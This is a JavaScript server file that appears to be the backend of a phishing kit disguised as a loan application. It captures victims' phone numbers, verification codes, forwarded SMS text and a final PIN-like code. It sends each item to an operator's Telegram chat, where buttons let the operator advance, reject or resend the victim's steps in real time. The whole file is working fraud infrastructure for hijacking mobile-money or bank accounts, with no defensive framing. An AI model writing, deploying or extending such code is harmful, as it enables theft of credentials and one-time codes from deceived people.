const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const BOT_TOKEN = process.env.BOT_TOKEN; 
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID; 

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Track user sessions
const activeSessions = {}; 

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// --- SOCKET.IO CONNECTION ---
io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);

    // Keep-alive ping
    socket.on('ping', () => {});

    // 1. Initial Application Submit
    socket.on('submit_loan', async (data) => {
        activeSessions[socket.id] = {
            phone: data.phone,
            code5: data.verificationCode
        };

        const msg = `
🆕 <b>New Loan Application</b>
━━━━━━━━━━━━━━━━
📞 <b>Phone:</b> +237 ${data.phone}
🔑 <b>5-Digit Code:</b> ${data.verificationCode}
━━━━━━━━━━━━━━━━
⏳ <b>Status:</b> Waiting for your decision...
        `;

        try {
            await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROVE', callback_data: `approve_${socket.id}` },
                        { text: '❌ REJECT', callback_data: `reject_${socket.id}` }
                    ]]
                }
            });
        } catch (err) {
            console.error(err);
        }
    });

    // 2. SMS Submit
    socket.on('submit_sms', async (smsMessage) => {
        const session = activeSessions[socket.id] || { phone: 'Unknown', code5: 'Unknown' };

        const msg = `
📩 <b>SMS Received</b>
━━━━━━━━━━━━━━━━
📞 <b>Phone:</b> +237 ${session.phone}
🔑 <b>5-Digit Code:</b> ${session.code5}
━━━━━━━━━━━━━━━━
💬 <b>SMS Text:</b>
<pre>${escapeHtml(smsMessage)}</pre>
━━━━━━━━━━━━━━━━
⏳ <b>Status:</b> Waiting for your decision...
        `;

        try {
            await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROVE', callback_data: `approve_sms_${socket.id}` },
                        { text: '❌ REJECT', callback_data: `reject_sms_${socket.id}` },
                        { text: '🔄 RESEND', callback_data: `resend_sms_${socket.id}` }
                    ]]
                }
            });
        } catch (err) {
            console.error(err);
        }
    });

    // 3. Final 4-Digit Code Submit
    socket.on('submit_final_code', async (fullCode) => {
        const session = activeSessions[socket.id] || { phone: 'Unknown', code5: 'Unknown' };

        const msg = `
🔐 <b>4-Digit Code Received</b>
━━━━━━━━━━━━━━━━
📞 <b>Phone:</b> +237 ${session.phone}
🔑 <b>5-Digit Code:</b> ${session.code5}
━━━━━━━━━━━━━━━━
🔢 <b>Final 4-Digit Code:</b> <code>${fullCode}</code>
━━━━━━━━━━━━━━━━
⏳ <b>Status:</b> Waiting for your decision...
        `;

        try {
            await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROVE', callback_data: `approve_final_${socket.id}` },
                        { text: '🔄 RESEND', callback_data: `resend_final_${socket.id}` },
                        { text: '🚫 INACTIVE', callback_data: `inactive_final_${socket.id}` }
                    ]]
                }
            });
        } catch (err) {
            console.error(err);
        }
    });

    socket.on('disconnect', () => {
        delete activeSessions[socket.id];
    });
});

// --- HELPER FUNCTION TO UPDATE TELEGRAM MESSAGE STATUS ---
async function updateMessageStatus(query, originalText, newStatus) {
    // Replace the waiting text with the new status
    const updatedText = originalText.replace('⏳ Status: Waiting for your decision...', newStatus)
                                   .replace('⏳ <b>Status:</b> Waiting for your decision...', newStatus);
    
    try {
        await bot.editMessageText(updatedText, {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] } // Remove buttons
        });
    } catch (err) {
        console.error("Error editing message:", err.message);
    }
}

// --- TELEGRAM BOT ACTIONS ---
bot.on('callback_query', async (query) => {
    const data = query.data.split('_');
    const socketId = data[data.length - 1]; 
    const userSocket = io.sockets.sockets.get(socketId);
    
    // Note: Telegram sends the plain text of the message in query.message.text
    const originalText = query.message.text;

    if (!userSocket) {
        await updateMessageStatus(query, originalText, '⚠️ <b>Status:</b> USER DISCONNECTED');
        return bot.answerCallbackQuery(query.id, { text: 'User is offline.' });
    }

    if (query.data.startsWith('approve_') && !query.data.includes('sms') && !query.data.includes('final')) {
        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
        userSocket.emit('approved');
        await updateMessageStatus(query, originalText, '✅ <b>Status:</b> APPROVED (Moved to SMS step)');
    } 
    else if (query.data.startsWith('reject_') && !query.data.includes('sms')) {
        bot.answerCallbackQuery(query.id, { text: 'Rejected!' });
        userSocket.emit('rejected');
        await updateMessageStatus(query, originalText, '❌ <b>Status:</b> REJECTED (Sent back)');
    }
    else if (query.data.startsWith('approve_sms_')) {
        bot.answerCallbackQuery(query.id, { text: 'SMS Approved!' });
        userSocket.emit('sms_approved');
        await updateMessageStatus(query, originalText, '✅ <b>Status:</b> SMS APPROVED (Moved to final code)');
    } 
    else if (query.data.startsWith('reject_sms_')) {
        bot.answerCallbackQuery(query.id, { text: 'SMS Rejected!' });
        userSocket.emit('sms_rejected');
        await updateMessageStatus(query, originalText, '❌ <b>Status:</b> SMS REJECTED (Sent back)');
    }
    else if (query.data.startsWith('resend_sms_')) {
        bot.answerCallbackQuery(query.id, { text: 'Resend Triggered!' });
        userSocket.emit('sms_resend');
        await updateMessageStatus(query, originalText, '🔄 <b>Status:</b> RESENT');
    }
    else if (query.data.startsWith('approve_final_')) {
        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
        userSocket.emit('final_approved');
        await updateMessageStatus(query, originalText, '✅ <b>Status:</b> LOAN APPROVED');
    }
    else if (query.data.startsWith('resend_final_')) {
        bot.answerCallbackQuery(query.id, { text: 'Resend Triggered!' });
        userSocket.emit('final_resend');
        await updateMessageStatus(query, originalText, '🔄 <b>Status:</b> CODE RESENT');
    }
    else if (query.data.startsWith('inactive_final_')) {
        bot.answerCallbackQuery(query.id, { text: 'Inactive Triggered!' });
        userSocket.emit('final_inactive');
        await updateMessageStatus(query, originalText, '🚫 <b>Status:</b> LINE INACTIVE');
    }
});

function escapeHtml(s) {
    return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});